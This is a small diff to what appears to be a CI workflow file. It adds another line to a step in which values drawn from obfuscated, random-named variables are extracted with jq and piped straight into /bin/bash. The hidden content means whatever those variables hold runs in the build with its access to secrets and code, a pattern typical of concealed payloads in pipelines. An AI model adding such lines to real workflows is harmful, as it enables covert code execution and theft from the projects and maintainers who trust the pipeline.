@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$pndxk08164" | jq -r .owb5949 | /bin/bash
           echo $q4 | jq -r .ws1 | /bin/bash
           echo $xibc139 | jq -r .ylen92 | /bin/bash
+          echo $tzl11089 | jq -r .kejv4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
